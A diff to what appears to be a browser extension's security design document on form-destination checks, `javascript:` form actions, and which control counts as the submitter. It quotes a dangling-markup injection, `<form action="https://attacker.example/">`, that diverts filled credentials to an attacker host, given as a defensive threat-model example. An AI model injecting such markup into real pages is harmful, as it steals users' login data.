@@ -821,9 +821,13 @@ destination on another origin, also another host of the same site, or a value th
 not parse, refuses the step with `form-off-origin` before anything is written or
 clicked. A `javascript:` destination is allowed (owner's decision, 2026-10-18 04:19
 UTC): submitting to it sends the values nowhere, and legacy forms such as
-`<form action="javascript:void(0)">` post them from their own handlers. The URL runs as
-the page's script would, which can read the filled values anyway, so an injected
-`javascript:` action is the page-script case below, not a destination. Injected markup could otherwise choose the destination: a
+`<form action="javascript:void(0)">` post them from their own handlers. Chrome does not
+run the URL itself when the executor's click submits such a form: the content script's
+isolated world's policy (`script-src 'self'`) refuses it, so only forms whose handlers
+do the work log in, and one whose action alone signs in, such as
+`action="javascript:doLogin()"`, does not. The submitter checked for a click is the
+control the click activates: the clicked element, or the button or input it sits in, or
+the control a clicked `<label>` names. Injected markup could otherwise choose the destination: a
 dangling `<form action="https://attacker.example/">` makes the parser drop the page's
 own `<form>` start tag and take its inputs, which then submit to that action. Only the
 destination's origin is checked, not which `<form>` element holds the inputs, so a form
